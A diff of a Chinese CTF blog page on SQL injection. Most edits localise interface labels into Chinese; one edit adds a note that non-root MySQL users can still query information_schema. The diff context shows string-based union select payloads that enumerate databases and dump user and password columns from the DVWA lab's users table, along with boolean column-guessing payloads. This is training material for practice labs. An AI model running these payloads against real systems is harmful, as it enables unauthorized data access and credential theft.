@@ -23,7 +23,7 @@
 <meta property="og:site_name" content="啦啦菌NODE">
 <meta property="og:description" content="—从零开始的笔记—">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-04-09T07:24:23.365Z">
+<meta property="og:updated_time" content="2018-04-18T08:12:12.001Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WEB-CTF中的SQL注入">
 <meta name="twitter:description" content="—从零开始的笔记—">
@@ -145,13 +145,13 @@
                 <div class="tips-box hide">
                     <div class="tips-arrow"></div>
                     <ul class="tips-inner">
-                        <li>Menu</li>
-                        <li>Tags</li>
+                        <li>菜单</li>
+                        <li>标签</li>
                         
-                        <li>Friends</li>
+                        <li>友情链接</li>
                         
                         
-                        <li>About Me</li>
+                        <li>关于我</li>
                         
                     </ul>
                 </div>
@@ -269,7 +269,7 @@
             </nav>
         </header>                
     </div>
-    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
       <div class="body-wrap"><article id="post-WEB-CTF中的SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -375,8 +375,12 @@
 <p>假设得到 2 ，以后想要查询的信息就放在第二个列处</p>
 <h3 id="4-利用函数来收集信息"><a href="#4-利用函数来收集信息" class="headerlink" title="4.利用函数来收集信息"></a>4.利用函数来收集信息</h3><p>查询sql自带的函数来确定当前用户，当前数据库等信息<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">用户：user()</div><div class="line">当前数据库：database()</div><div class="line">数据库版本：version()</div><div class="line">@@hostname （用户）</div><div class="line">@@datadir   (数据库在文件的位置)</div><div class="line">@@version  （版本)</div><div class="line">@@version_compile_OS  (操作系统版本)</div><div class="line"></div><div class="line">$name=' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>() <span class="comment">--+</span></div><div class="line"></div><div class="line">全局：<span class="keyword">select</span> <span class="number">2</span>列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>() <span class="comment">-- '</span></div></pre></td></tr></table></figure></p>
 <p>如果为root用户，就可以访问information_schema数据库</p>
+<blockquote>
+<p>n个月后，当我在配置mysql比赛环境的时候，第一次用到了除了ROOT用户以外的其他用户。<br>创建了一个新的用户，修改了它的权限。发现它竟然也可以直接访问information_schema表<br>三观崩坏的同时，去查了一波资料<br>mysql每个用户都可以访问information_schema，且没法设置不能访问，但是不用担心权限问题，因为information_schema里面的内容会根据用户权限而变化。即该用户只能从information_schema里面查询到自己有权限查看的库和表等<br>同时因为CTF题目而产生的美丽的误会，大致是因为题目单独对于information_schema进行了过滤，才访问不到的</p>
+</blockquote>
+<p>所以，不要因为不是root账户，就不去尝试这个最省事的办法！<br>都需要先尝试访问information_schema!</p>
 <h3 id="5-通过-union-查询数据库"><a href="#5-通过-union-查询数据库" class="headerlink" title="5.通过 union 查询数据库"></a>5.通过 union 查询数据库</h3><p>  通过<strong>information_schema数据库</strong>中的tables，columns来查询目标的数据库，表，列<br>  再直接查询内容<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">查询数据库</div><div class="line">$name=' union <span class="keyword">select</span> <span class="number">1</span>,table_schema <span class="keyword">from</span> information_schema.tables <span class="comment">--+</span></div><div class="line"></div><div class="line">查询数据库中有多少个表</div><div class="line">$<span class="keyword">name</span>=<span class="string">' union select table_schema,count(*) from information_schema.tables --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询指定数据库中的表名</span></div><div class="line"><span class="string">$name='</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'dvwa'</span> <span class="comment">--+</span></div><div class="line"></div><div class="line">查询指定数据库指定表中的列名</div><div class="line">$<span class="keyword">name</span>=<span class="string">' union select table_name,column_name from information_schema.columns where table_schema='</span>dvwa<span class="string">' and table_name='</span><span class="keyword">users</span><span class="string">'--+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">查询指定数据库指定表的列的内容</span></div><div class="line"><span class="string">$name='</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> dvwa.users <span class="comment">--+</span></div><div class="line"></div><div class="line">查询链接显示</div><div class="line">$<span class="keyword">name</span>=<span class="string">' union select null,concat_ws('</span> : <span class="string">',user,password) from dvwa.users --(空格)</span></div><div class="line"><span class="string">$name='</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span>,<span class="keyword">concat</span>(<span class="keyword">user</span>,<span class="string">' : '</span>,<span class="keyword">password</span>) <span class="keyword">from</span> dvwa.users <span class="comment">--(空格)</span></div><div class="line">ps. <span class="string">':'</span> 编码<span class="comment">---&gt; 0x3a</span></div></pre></td></tr></table></figure></p>
-<h3 id="6-无权限时，猜解列名，表名，库名"><a href="#6-无权限时，猜解列名，表名，库名" class="headerlink" title="6.无权限时，猜解列名，表名，库名"></a>6.无权限时，猜解列名，表名，库名</h3><p>  当前用户不是root用户，就无权访问information_schema库<br>  只能通过返回页面的两种状态判断是否猜解正确，其原理跟布尔型sql盲注一致<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line">$name=' and column is null <span class="comment">--+    </span></div><div class="line"></div><div class="line">全句：<span class="keyword">select</span> <span class="number">2</span>列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">and</span> <span class="keyword">column</span> <span class="keyword">is</span> <span class="literal">null</span> <span class="comment">-- '</span></div></pre></td></tr></table></figure></p>
+<h3 id="6-无法访问时，猜解列名，表名，库名"><a href="#6-无法访问时，猜解列名，表名，库名" class="headerlink" title="6.无法访问时，猜解列名，表名，库名"></a>6.无法访问时，猜解列名，表名，库名</h3><p>  当无法访问information_schema库时<br>  只能通过返回页面的两种状态判断是否猜解正确，其原理跟布尔型sql盲注一致<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line">$name=' and column is null <span class="comment">--+    </span></div><div class="line"></div><div class="line">全句：<span class="keyword">select</span> <span class="number">2</span>列 <span class="keyword">from</span> 表 <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">''</span> <span class="keyword">and</span> <span class="keyword">column</span> <span class="keyword">is</span> <span class="literal">null</span> <span class="comment">-- '</span></div></pre></td></tr></table></figure></p>
 <p>用字典文件替换column，如果不存在此列，有错误；存在此列，无返回(类似来判断，下同)<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">2.猜解当前表名<span class="comment">------已猜出列名</span></div><div class="line">$name=' and table.user is null <span class="comment">--+	</span></div><div class="line"></div><div class="line">3.猜解当前数据库名<span class="comment">--已猜出列名，表名</span></div><div class="line">$name=' and db.table.user is null <span class="comment">--+</span></div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line">$name=' and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">table</span>)&gt;<span class="number">0</span> <span class="comment">--+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</span></div></pre></td></tr></table></figure></p>
 <p>在猜解到你所要的库，表，列之后可以直接union select 查询</p>
 <h2 id="数字型SQL注入"><a href="#数字型SQL注入" class="headerlink" title="数字型SQL注入"></a>数字型SQL注入</h2><p>数字型注入和字符型注入原理相同，但更为简单。<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$name=1 and 1=1 #</div></pre></td></tr></table></figure></p>
@@ -403,17 +407,17 @@
   
     
     <div class="copyright">
-        <p><span>Title:</span><a href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></p>
-        <p><span>Author:</span><a href="/" title="Back to Homepage">LaLa</a></p>
-        <p><span>Created:</span>2017-08-29, 05:16:14</p>
-        <p><span>Updated:</span>2018-04-09, 15:24:23</p>
+        <p><span>本文标题:</span><a href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">LaLa</a></p>
+        <p><span>发布时间:</span>2017-08-29, 05:16:14</p>
+        <p><span>最后更新:</span>2018-04-18, 16:12:12</p>
         <p>
-            <span>Full URL:</span><a class="post-url" href="/2017/08/29/WEB-CTF中的SQL注入/" title="WEB-CTF中的SQL注入">http://lalajun.com/2017/08/29/WEB-CTF中的SQL注入/</a>
-            <span class="copy-path" data-clipboard-text="From http://lalajun.com/2017/08/29/WEB-CTF中的SQL注入/　　By LaLa" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/08/29/WEB-CTF中的SQL注入/" title="WEB-CTF中的SQL注入">http://lalajun.com/2017/08/29/WEB-CTF中的SQL注入/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://lalajun.com/2017/08/29/WEB-CTF中的SQL注入/　　作者: LaLa" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
-            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
         </p>
     </div>
 
@@ -434,9 +438,9 @@
 </article>
 
     <div id="toc" class="toc-article">
-        <strong class="toc-title">Contents</strong>
+        <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入的基本原理"><span class="toc-text">SQL注入的基本原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入的分类"><span class="toc-text">SQL注入的分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单的了解数据库的结构"><span class="toc-text">简单的了解数据库的结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#字符型SQL注入的步骤"><span class="toc-text">字符型SQL注入的步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-判断是否有SQL注入点"><span class="toc-text">1.判断是否有SQL注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-判断select语句中有几列"><span class="toc-text">2.判断select语句中有几列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-判断显示的信息是第几列的信息"><span class="toc-text">3.判断显示的信息是第几列的信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-利用函数来收集信息"><span class="toc-text">4.利用函数来收集信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-通过-union-查询数据库"><span class="toc-text">5.通过 union 查询数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-无权限时，猜解列名，表名，库名"><span class="toc-text">6.无权限时，猜解列名，表名，库名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数字型SQL注入"><span class="toc-text">数字型SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数据库函数"><span class="toc-text">数据库函数</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入的基本原理"><span class="toc-text">SQL注入的基本原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入的分类"><span class="toc-text">SQL注入的分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单的了解数据库的结构"><span class="toc-text">简单的了解数据库的结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#字符型SQL注入的步骤"><span class="toc-text">字符型SQL注入的步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-判断是否有SQL注入点"><span class="toc-text">1.判断是否有SQL注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-判断select语句中有几列"><span class="toc-text">2.判断select语句中有几列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-判断显示的信息是第几列的信息"><span class="toc-text">3.判断显示的信息是第几列的信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-利用函数来收集信息"><span class="toc-text">4.利用函数来收集信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-通过-union-查询数据库"><span class="toc-text">5.通过 union 查询数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-无法访问时，猜解列名，表名，库名"><span class="toc-text">6.无法访问时，猜解列名，表名，库名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数字型SQL注入"><span class="toc-text">数字型SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数据库函数"><span class="toc-text">数据库函数</span></a></li></ol>
         
     </div>
     <style>
@@ -450,10 +454,10 @@
         }
     </style>
 
-    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
     <script>
-        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
     </script>
 
 
@@ -467,19 +471,19 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/09/18/ZJGSCTF_writeup/" title="Pre: ZJGSCTF_writeup">
+            <a href="/2017/09/18/ZJGSCTF_writeup/" title="上一篇: ZJGSCTF_writeup">
                 <i class="fa fa-angle-left"></i>
             </a>
         
 
-        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/" title="Back to Homepage"><i class="fa fa-home"></i></a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
     </div>
 
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/04/09/WEB-SQL报错注入/">WEB-SQL报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/web-phpinfo包含临时文件/">WEB-基于phpinfo的包含临时文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/WEB-LFI与RFI利用/">WEB-LFI与RFI利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/WEB-PHP核心配置/">WEB-PHP核心配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/WEB-Cookie注入与伪静态注入/">WEB-Cookie注入与伪静态注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/30/WEB-HTTP基础/">WEB-HTTP基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/25/python笔记/">python2.7笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与交易/">比特币&区块链与交易</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与挖矿/">比特币&区块链与挖矿</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/05/WEB-CTF中的SQL文件操作/">WEB-CTF中的SQL文件操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/WEB-CTF中的sql盲注/">WEB-CTF中的sql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></li></ul>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/04/21/docker/">Docker使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/09/WEB-SQL报错注入/">WEB-SQL报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/web-phpinfo包含临时文件/">WEB-基于phpinfo的包含临时文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/WEB-LFI与RFI利用/">WEB-LFI与RFI利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/WEB-PHP核心配置/">WEB-PHP核心配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/WEB-Cookie注入与伪静态注入/">WEB-Cookie注入与伪静态注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/30/WEB-HTTP基础/">WEB-HTTP基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/25/python笔记/">python2.7笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与交易/">比特币&区块链与交易</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与挖矿/">比特币&区块链与挖矿</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/05/WEB-CTF中的SQL文件操作/">WEB-CTF中的SQL文件操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/WEB-CTF中的sql盲注/">WEB-CTF中的sql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></li></ul>
 
 
 
@@ -496,14 +500,14 @@
                 2017-2018 LaLa
             </div>
             <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="A fast, simple &amp; powerful blog framework">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="Another simple and elegant theme for Hexo  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
             </div>
         </div>
         
             <div class="visit">
                 
                     <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                         </span>
                     </span>
                 
@@ -512,7 +516,7 @@
                 
                 
                     <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                         </span>
                     </span>
                 
@@ -545,9 +549,9 @@
 
 
 <div class="scroll" id="scroll">
-    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
 </div>
 <script>
     // Open in New Window
